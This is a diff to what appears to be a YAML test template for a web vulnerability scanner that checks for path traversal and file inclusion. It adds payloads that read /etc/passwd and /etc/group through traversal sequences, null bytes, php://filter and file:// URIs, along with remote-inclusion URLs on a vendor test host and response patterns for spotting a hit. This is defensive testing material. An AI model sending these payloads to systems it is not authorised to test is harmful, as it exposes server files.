@@ -1,19 +1,31 @@
 generate:
   - payload:
+    # LFI
     - /etc/passwd
     - /%5c../%5c../%5c../%5c../%5c../%5c../%5c../etc/passwd/
     - /../../../../../../../../../etc/passwd
     - /../../../../../../../../../etc/passwd%00
     - /../../../../../../../../../etc/passwd\u0000
+    - "php://filter/convert.base64-encode/resource=../../../../../../../../../../etc/group"
+    - "php://filter/convert.base64-encode/resource=../../../../../../../../../../etc/group\x00"
+    - 'file:///etc/passwd'
+    - 'file:///../../../../../../../../../etc/passwd'
+    - 'file:///../../../../../../../../../etc/passwd\x00'
+
+    # RFI
     - 'http://wallarm.tools/rfi'
     - 'http://wallarm.tools/rfi.php'
     - 'http://wallarm.tools/rfi_location.php'
-    - 'file:///etc/passwd'
+
   - method:
     - replace
+
 detect:
   - response:
+    - body: 'cm9vdDp4OjA6Cm' #part of base64 < /etc/group
     - body: '(root:x:)|(/bin/bash)|(/usr/sbin/nologin)'
+    - body: 'WLRM-RFI-TEST'
+
 meta-info:
   - type: ptrav
   - threat: 80
@@ -21,7 +33,6 @@ meta-info:
     - Path Traversal
     - Arbitrary File Reading
     - Misconfiguration
-    - Directory Listing
     - Insecure Direct Object References
     - Broken Access Control
     - OWASP
@@ -29,6 +40,3 @@ meta-info:
     - A4:2010
     - A4:2013
     - A5:2017
-    - JBOSS
-    - Wildfly
-    - CVE-2018-1047 # TODO: more CVE references, it's a common bug. Or we need to split between classic and custom vectors
